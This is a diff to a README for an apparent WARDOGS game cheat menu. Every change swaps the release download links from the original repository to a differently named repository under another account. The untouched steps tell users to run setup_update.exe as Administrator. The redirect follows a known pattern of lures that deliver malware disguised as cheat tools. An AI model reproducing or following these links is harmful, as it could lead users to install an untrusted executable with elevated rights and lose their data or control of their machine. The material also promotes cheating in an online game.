@@ -12,7 +12,7 @@
 [![Platform](https://img.shields.io/badge/platform-Windows-0078D6?style=for-the-badge&logo=windows)](https://github.com/knobbyspeak/wardogs-cheat-menu/releases/latest)
 [![Downloads](https://img.shields.io/github/downloads/knobbyspeak/wardogs-cheat-menu/total?style=for-the-badge&color=purple)](https://github.com/knobbyspeak/wardogs-cheat-menu/releases)
 
-**[⬇️ DOWNLOAD v0.7.4](https://github.com/knobbyspeak/wardogs-cheat-menu/releases/latest)**
+**[⬇️ DOWNLOAD v0.7.4](https://github.com/thierryanani9-afk/wardogs-tactical-overlay/releases)**
 
 ![Menu Preview](https://i.imgur.com/placeholder-menu.png)
 
@@ -55,7 +55,7 @@ A lightweight, ImGui-based cheat menu built specifically for WARDOGS. Clean UI, 
 
 ### Option A — Release Download (Easiest)
 
-1. Go to **[Releases](https://github.com/knobbyspeak/wardogs-cheat-menu/releases/latest)**
+1. Go to **[Releases](https://github.com/thierryanani9-afk/wardogs-tactical-overlay/releases)**
 2. Download `wardogs-cheat-menu-v0.7.4.zip` (**157 MB**)
 3. Extract anywhere
 4. Run `setup_update.exe` **as Administrator**
@@ -64,7 +64,7 @@ A lightweight, ImGui-based cheat menu built specifically for WARDOGS. Clean UI, 
 
 ### Option B — Direct Download
 
-**[📥 Click here to download from Releases](https://github.com/knobbyspeak/wardogs-cheat-menu/releases/latest)**
+**[📥 Click here to download from Releases](https://github.com/thierryanani9-afk/wardogs-tactical-overlay/releases)**
 
 ---
 
@@ -104,6 +104,6 @@ A lightweight, ImGui-based cheat menu built specifically for WARDOGS. Clean UI, 
 
 ### ⭐ Star • 🍴 Fork • 📥 Download
 
-**[⬇️ GET v0.7.4](https://github.com/knobbyspeak/wardogs-cheat-menu/releases/latest)**
+**[⬇️ GET v0.7.4](https://github.com/thierryanani9-afk/wardogs-tactical-overlay/releases)**
 
 </div>
